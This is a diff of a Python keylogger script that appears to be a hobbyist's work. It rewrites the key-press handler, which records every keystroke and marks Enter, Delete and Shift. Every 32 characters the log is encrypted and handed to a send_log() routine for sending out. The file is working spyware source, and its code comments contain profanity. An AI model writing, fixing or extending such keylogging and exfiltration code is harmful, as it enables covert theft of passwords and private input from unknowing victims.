@@ -47,35 +47,31 @@ word = ''
 iv = ''
 
 #Building the keylogger (seems to work just fine)
+
 def on_press(key):
-    global word
     global full_log
-    global email
-    global email_char_lim
-    global data_to_be_encrypted
-    if key == Key.space or key == Key.enter:
-        word += ' '
-        full_log += word
-        word = ''
-        if len(full_log) == 32:
-              data_to_be_encrypted = full_log
-              full_log = ''
-              encrypt(data_to_be_encrypted, password)
-              data_to_be_encrypted = ''
-              send_log()
-              ciphertext = ''
-           
-    elif key == Key.shift_l or key == Key.shift_r:
-           return
-    elif key == Key.backspace:
-      word = word[:-1]
+    k = str(key).replace("'", "")
+     
+    if k == 'Key.enter':
+        full_log += "[ENTER]\n"
+    elif k == 'Key.backspace':
+        full_log = full_log[:-1] 
+    elif k == 'Key.shift':
+        full_log += '^'
+    elif k == 'Key.delete':
+        full_log += '[DEL]'
+    elif len(full_log) == 32:
+      data_to_be_encrypted = full_log
+      full_log = ''
+      encrypt(data_to_be_encrypted, password)
+      data_to_be_encrypted = ''
+      send_log()
+      ciphertext = ''
     else:
-       char = f'{key}'
-       char = char[1:-1]
-       word += char
-   
-    if key == Key.esc:
-     return False
+      full_log += k 
+      print(len(full_log))
+           
+
 
 #My most precious fucking encryption function i swear i will fucking kill this piece of shit code
 
